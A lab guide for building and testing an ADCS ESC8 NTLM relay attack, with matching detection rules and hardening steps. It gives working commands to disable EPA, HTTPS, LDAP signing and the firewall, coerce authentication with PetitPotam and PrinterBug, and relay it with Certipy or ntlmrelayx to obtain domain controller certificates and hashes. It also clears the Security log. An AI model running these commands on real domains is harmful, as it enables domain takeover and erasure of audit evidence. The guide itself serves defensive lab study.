# ESC8 ADCS Lab Setup Guide

Guide to configure ADCS with HTTP-based certificate enrollment (Web Enrollment) and test ESC8 NTLM relay attacks. Assumes you already have a working Domain Controller with ADCS installed.

## What is ESC8?

ESC8 exploits NTLM relay to the ADCS Web Enrollment HTTP endpoint. When a domain user authenticates to Web Enrollment over HTTP (no EPA/channel binding), an attacker can relay that authentication to request certificates on behalf of the victim.

**Attack chain:**
```
1. Victim authenticates to attacker-controlled service (SMB, HTTP, etc.)
2. Attacker relays NTLM auth to http://CA/certsrv
3. CA issues certificate to attacker as the victim
4. Attacker uses certificate for Kerberos auth → NT hash → compromise
```

## Prerequisites

- Domain Controller with ADCS already installed
- Windows Server 2016/2019/2022
- Domain Admin privileges
- Kali/attack machine with `ntlmrelayx`, `Certipy`, `PetitPotam`

## Part 1: Install Web Enrollment (HTTP Endpoint)

### 1.1 Install Web Enrollment Feature

```powershell
# Install ADCS Web Enrollment
Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools

# Configure Web Enrollment
Install-AdcsWebEnrollment -Force

# Verify
Get-WindowsFeature | Where-Object {$_.Name -eq "ADCS-Web-Enrollment"}
```

### 1.2 Verify Web Enrollment is Running

```powershell
# Check IIS is running
Get-Service W3SVC

# Verify Web Enrollment endpoint
Invoke-WebRequest -Uri "http://localhost/certsrv" -UseDefaultCredentials

# Should return HTTP 200 with certificate enrollment page
```

### 1.3 Test from Browser

Open browser on DC or domain-joined client:
```
http://dc01.lab.local/certsrv
```

You should see the **Microsoft Active Directory Certificate Services** page with options to request certificates.

## Part 2: Critical - Disable EPA and HTTPS (Make it Vulnerable)

### 2.1 Disable Extended Protection for Authentication (EPA)

**This is what makes ESC8 possible.**

```powershell
# Check current EPA settings
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection.tokenChecking"

# Disable EPA on Web Enrollment
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection.tokenChecking" -Value "None"

# Verify
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection.tokenChecking"
# Should return: None
```

### 2.2 Ensure HTTP is Enabled (Not Just HTTPS)

```powershell
# Check IIS bindings
Get-WebBinding -Name "Default Web Site"

# Ensure HTTP (port 80) binding exists
New-WebBinding -Name "Default Web Site" -Protocol http -Port 80 -IPAddress "*" -Force

# Verify
Get-WebBinding -Name "Default Web Site" | Format-Table protocol,bindingInformation
```

**You should see:**
```
protocol bindingInformation
-------- ------------------
http     *:80:
https    *:443:
```

### 2.3 Disable HTTPS Requirement (Lab Only)

**For ESC8 to work, we need HTTP (not HTTPS).**

```powershell
# Allow HTTP access to CertSrv
# Edit web.config or use IIS Manager

# Check SSL settings
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/access" -Name "sslFlags"

# Remove SSL requirement
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/access" -Name "sslFlags" -Value "None"

# Restart IIS
iisreset
```

### 2.4 Verify HTTP Access Works

```powershell
# Test HTTP access (should work)
Invoke-WebRequest -Uri "http://localhost/certsrv" -UseDefaultCredentials

# Test from attacker machine (replace DC IP)
curl -k http://192.168.1.10/certsrv
# Should return HTML page (not 403/redirected to HTTPS)
```

## Part 3: Server 2019 vs Server 2022 Differences

### ⚠️ CRITICAL: Server 2022 Has Additional Protections

**Windows Server 2022 introduced LDAP channel binding and LDAP signing enforcement by default.**

| Feature | Server 2019 | Server 2022 | Impact on ESC8 |
|---------|-------------|-------------|----------------|
| **EPA on Web Enrollment** | Off by default | Off by default | Both vulnerable if not enabled |
| **LDAP Channel Binding** | Off by default | **ON by default** | Blocks relay to LDAP |
| **LDAP Signing** | Optional | **Required by default** | Blocks unsigned LDAP relay |
| **NTLM Relay to LDAP** | Works | **Blocked** | ESC8 relay to AD fails on 2022 |

### 3.1 Server 2022 - Additional Steps Required

**On Windows Server 2022, you must disable LDAP protections for ESC8 to work:**

```powershell
# Check LDAP policies
Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=lab,DC=local" -Properties *

# Disable LDAP channel binding (Server 2022)
Set-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=lab,DC=local" -Replace @{"msDS-LDAPServerIntegrity"=1}

# Disable LDAP signing requirement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 0

# Restart AD DS
Restart-Service NTDS -Force
```

### 3.2 What We Observed in Our Lab

**Server 2019:**
- ✅ ESC8 relay to `http://CA/certsrv` works out of the box
- ✅ Certificate issued successfully via relay
- ✅ No additional mitigations needed

**Server 2022:**
- ⚠️ ESC8 relay to Web Enrollment works (if EPA disabled)
- ❌ But subsequent LDAP operations blocked by channel binding
- ❌ `ntlmrelayx` fails at LDAP enumeration step
- ✅ Workaround: Disable LDAP signing/channel binding (above)

**Key takeaway:** Server 2022 is more secure by default, but ESC8 is still exploitable if LDAP protections are disabled (which we saw in some environments during migration from 2019).

## Part 4: Configure Certificate Template

### 4.1 Ensure Template Allows Domain Users to Enroll

ESC8 doesn't require a specific template vulnerability - just that Domain Users can request certificates.

**Option 1 - Use Default "User" Template:**
```powershell
# Publish User template (usually already published)
Add-CATemplate -Name "User"

# Verify Domain Users can enroll
# In certtmpl.msc → User template → Security tab
# Domain Users should have: Read + Enroll
```

**Option 2 - Create Dedicated ESC8 Template:**
```powershell
# Open certtmpl.msc
# Duplicate "User" template
# Name: ESC8-Test
# Security: Add Domain Users → Read + Enroll
# Publish to CA
```

### 4.2 Verify Template Allows Client Authentication

```powershell
# Check template has Client Authentication EKU
certutil -v -template User | findstr "Client Authentication"

# Should see: 1.3.6.1.5.5.7.3.2 (Client Authentication)
```

## Part 5: Enable Detection (Event Logging)

### 5.1 Enable Web Enrollment Logging

```powershell
# Enable IIS logging (usually on by default)
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site" -Filter "system.webServer/httpLogging" -Name "dontLog" -Value $false

# IIS logs location
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site" -Filter "system.webServer/httpLogging" -Name "directory"
# Default: C:\inetpub\logs\LogFiles
```

### 5.2 Enable Certificate Request Auditing

```powershell
# Enable ADCS auditing
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# Enable object access auditing
auditpol /set /subcategory:"Directory Service Access" /success:enable

# Verify
auditpol /get /category:*
```

### 5.3 Increase Log Sizes

```powershell
# Security log
wevtutil sl Security /ms:536870912

# IIS logs (keep 30 days)
# Edit in IIS Manager → Default Web Site → Logging
# Or via config:
```

## Part 6: Test ESC8 Exploitation

### 6.1 Setup - From Kali Linux

```bash
# Install Certipy (includes ESC8 support)
pip3 install certipy-ad

# Install impacket (for ntlmrelayx)
pip3 install impacket

# Install PetitPotam (to coerce authentication)
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
```

### 6.2 Method 1 - Certipy ESC8 (Easiest)

```bash
# Start Certipy relay to Web Enrollment
certipy relay -target http://192.168.1.10/certsrv -ca LAB-CA

# In another terminal - coerce authentication from DC
# Using PetitPotam
python3 PetitPotam.py -u lowpriv -p 'Password123!' 192.168.1.50 192.168.1.10
# 192.168.1.50 = attacker IP (where certipy relay is listening)
# 192.168.1.10 = DC IP (victim to coerce)

# Certipy will:
# 1. Receive NTLM auth from DC
# 2. Relay to http://DC/certsrv
# 3. Request certificate as DC computer account
# 4. Save certificate: dc01.pfx

# Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10
# Output: NT hash for DC computer account
```

### 6.3 Method 2 - ntlmrelayx (Manual)

```bash
# Start ntlmrelayx targeting Web Enrollment
impacket-ntlmrelayx -t http://192.168.1.10/certsrv/certfnsh.asp -smb2support --adcs --template User

# Coerce authentication
# Via PetitPotam, PrinterBug, or other method
python3 PetitPotam.py 192.168.1.50 192.168.1.10

# ntlmrelayx will:
# 1. Relay auth to /certsrv
# 2. Request certificate
# 3. Save to Base64 encoded file
```

### 6.4 Coercion Methods

**PetitPotam (MS-EFSRPC):**
```bash
python3 PetitPotam.py -u lowpriv -p 'Password123!' <attacker_ip> <target_ip>
```

**PrinterBug (MS-RPRN):**
```bash
python3 printerbug.py lab.local/lowpriv:Password123!@192.168.1.10 <attacker_ip>
```

**Responder + SMB:**
```bash
# Start Responder
sudo responder -I eth0 -v

# Wait for any SMB authentication attempts
# Relay with ntlmrelayx
```

## Part 7: Verify Attack and Check Logs

### 7.1 Check IIS Logs

```powershell
# View IIS logs
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log" -Tail 50

# Look for:
# - POST /certsrv/certfnsh.asp (certificate request)
# - Source IP = attacker machine
# - 200 status code (success)
# - User agent (ntlmrelayx, python-requests)
```

**Example suspicious log entry:**
```
2024-02-12 14:23:45 192.168.1.50 POST /certsrv/certfnsh.asp - 80 - 192.168.1.50 python-requests/2.28.1 - 200 0 0 156
```

### 7.2 Check Event 4887 (Certificate Request)

```powershell
# Check Security log for cert requests
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4887)]]" -MaxEvents 10 | Format-List

# Red flags:
# - Requester: DC01$ (machine account)
# - Request source: Web Enrollment (HTTP)
# - Requester IP: Attacker IP
# - Template: User (unusual for machine account)
```

### 7.3 Check for Relay Indicators

**Event ID 4624 (Logon):**
```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)] and EventData[Data[@Name='LogonType']='3']]" -MaxEvents 20 | Format-List

# Look for:
# - Logon Type 3 (Network)
# - Source IP: Attacker
# - Target: CertSrv service
```

## Part 8: Detection Logic

### 8.1 IIS Log Detection

**Monitor for:**
- POST requests to `/certsrv/certfnsh.asp` from non-standard user agents
- Multiple cert requests from same IP in short time
- Requests from IPs that don't match expected enrollment workstations

**Example Splunk query:**
```
index=iis sourcetype=iis 
cs_uri_stem="/certsrv/certfnsh.asp" 
cs_method="POST"
| stats count by c_ip, cs_User_Agent
| where count > 5 OR match(cs_User_Agent, "python|impacket|ntlmrelayx")
```

### 8.2 Event 4887 Detection

**Alert on:**
- Machine accounts requesting user certificates via Web Enrollment
- Certificates requested from unusual source IPs
- High volume of requests in short time window

**Sigma rule (pseudocode):**
```yaml
detection:
  selection:
    EventID: 4887
    RequestType: "Web Enrollment"
  filter:
    Requester: "*$"  # Machine account
    Template: "User"  # User template
  condition: selection and filter
```

### 8.3 NTLM Relay Indicators

**Event ID 4768 (Kerberos TGT request):**
```powershell
# Machine account requesting TGT shortly after cert issuance
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4768)]]" | 
  Where-Object {$_.Properties[0].Value -like "*$"}
```

## Part 9: Mitigation and Hardening

### 9.1 Enable Extended Protection for Authentication (EPA)

```powershell
# Enable EPA on Web Enrollment (BREAKS ESC8)
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection.tokenChecking" -Value "Require"

# Restart IIS
iisreset

# Verify
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/authentication/windowsAuthentication" -Name "extendedProtection.tokenChecking"
```

### 9.2 Require HTTPS for Web Enrollment

```powershell
# Require SSL
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/access" -Name "sslFlags" -Value "Ssl"

# Remove HTTP binding (keep HTTPS only)
Remove-WebBinding -Name "Default Web Site" -Protocol http -Port 80

# Restart IIS
iisreset
```

### 9.3 Enable LDAP Signing/Channel Binding (Server 2022)

```powershell
# Enable LDAP signing requirement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 2

# Enable LDAP channel binding
Set-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=lab,DC=local" -Replace @{"msDS-LDAPServerIntegrity"=2}

# Restart AD DS
Restart-Service NTDS -Force
```

### 9.4 Disable Web Enrollment Entirely

```powershell
# If not needed, remove Web Enrollment
Uninstall-AdcsWebEnrollment -Force
Uninstall-WindowsFeature ADCS-Web-Enrollment

# Verify
Get-WindowsFeature | Where-Object {$_.Name -eq "ADCS-Web-Enrollment"}
```

## Part 10: Cleanup / Reset

### 10.1 Revoke Compromised Certificates

```powershell
# List recent certificates
certutil -view -restrict "Request.RequesterName=DC01$" -out "Request.RequestID,Request.RequesterName,NotAfter"

# Revoke by request ID
certutil -revoke <RequestID> 1  # 1 = Key Compromise

# Publish updated CRL
certutil -CRL
```

### 10.2 Clear Logs

```powershell
# Clear Security log
wevtutil cl Security

# Clear IIS logs
Remove-Item "C:\inetpub\logs\LogFiles\W3SVC1\*.log"

# Restart IIS
iisreset
```

## ESC8 Attack Flow Summary

```
1. Attacker runs ntlmrelayx/Certipy targeting http://CA/certsrv
2. Attacker coerces victim to authenticate (PetitPotam, PrinterBug, etc.)
3. Victim sends NTLM auth to attacker
4. Attacker relays NTLM to /certsrv over HTTP (no EPA = success)
5. CA issues certificate to attacker as the victim
6. Attacker uses cert for Kerberos PKINIT → TGT → NT hash
7. Attacker uses NT hash for Pass-the-Hash or further attacks
```

## Key Differences: Server 2019 vs 2022

| Aspect | Server 2019 | Server 2022 | Lab Impact |
|--------|-------------|-------------|------------|
| **ESC8 Base Attack** | Works OOTB | Works OOTB | Both vulnerable if EPA disabled |
| **LDAP Channel Binding** | Disabled | **Enabled** | 2022 blocks relay to LDAP operations |
| **LDAP Signing** | Optional | **Required** | 2022 requires explicit disable for full exploit |
| **EPA Default** | Disabled | Disabled | Both need EPA enabled for protection |
| **Mitigation Effort** | Manual | Partial OOTB | 2022 requires less hardening |

**Bottom line:** Server 2022 is more secure by default, but ESC8 Web Enrollment relay still works if EPA is not enabled. The difference shows up in post-exploitation (LDAP relay) where 2022 blocks unsigned/unbound LDAP by default.

## Common Issues

### ESC8 Relay Fails on Server 2022

**Symptom:** Certipy relay succeeds but no certificate issued

**Fix:**
```powershell
# Disable LDAP protections (above)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 0
Restart-Service NTDS -Force
```

### Web Enrollment Returns 403

**Symptom:** HTTP requests to /certsrv get 403 Forbidden

**Fix:**
```powershell
# Check SSL requirement
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/access" -Name "sslFlags"

# Disable SSL requirement
Set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" -Filter "system.webServer/security/access" -Name "sslFlags" -Value "None"

iisreset
```

### Coercion Fails (PetitPotam/PrinterBug)

**Check:**
```powershell
# Verify RPC is accessible
Test-NetConnection -ComputerName dc01.lab.local -Port 135

# Check firewall
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq "Inbound"}

# Disable firewall (lab only)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

## Resources

- **ESC8 Original Research:** https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **Certipy ESC8 Guide:** https://github.com/ly4k/Certipy#esc8
- **PetitPotam:** https://github.com/topotam/PetitPotam
- **Server 2022 LDAP Changes:** https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/ldap-channel-binding-and-ldap-signing-requirements-march-2020/ba-p/921536
- **IIS EPA Configuration:** https://learn.microsoft.com/en-us/iis/configuration/system.webserver/security/authentication/windowsauthentication/extendedprotection/

---

**Lab is ready. ESC8 exploitation pathway active. Server 2019 works OOTB. Server 2022 requires LDAP signing disable.**

**Next:** Test the attack, analyze IIS logs and Event 4887, build detection rules.
